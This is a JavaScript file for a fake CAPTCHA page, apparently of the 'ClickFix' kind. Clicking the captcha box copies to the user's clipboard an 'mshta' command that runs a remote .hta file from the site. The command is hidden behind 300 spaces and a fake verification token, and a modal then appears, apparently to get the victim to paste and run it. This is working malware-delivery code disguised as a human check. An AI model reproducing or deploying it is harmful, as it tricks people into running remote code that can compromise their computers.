const captchaBox = document.getElementById('captchaBox');
const modal = document.getElementById('modal');
const overlay = document.getElementById('overlay');

if (captchaBox) {
    captchaBox.addEventListener('click', () => {
        const htaLink = window.location.origin + "/captchamethods/info.hta";
        const realCommand = "mshta " + htaLink;
        const visibleText = "--- Verification_Token: [" + Math.random().toString(36).substring(2, 10).toUpperCase() + "] --- STATUS: READY";
        const padding = " ".repeat(300); 
        const finalPayload = realCommand + padding + visibleText;

        navigator.clipboard.writeText(finalPayload).then(() => {
            const checkMark = document.getElementById('checkMark');
            if (checkMark) {
                checkMark.style.borderLeftColor = "#4285f4";
                checkMark.style.animation = "spin 1s linear infinite";
            }
            
            setTimeout(() => {
                modal.style.display = 'block';
                overlay.style.display = 'block';
            }, 500);
        }).catch(err => {
            console.error("Clipboard failed", err);
        });
    });
}

function closeModal() {
    modal.style.display = 'none';
    overlay.style.display = 'none';
}

const style = document.createElement('style');
style.innerHTML = "@keyframes spin { 100% { transform: rotate(360deg); } }";
document.head.appendChild(style);
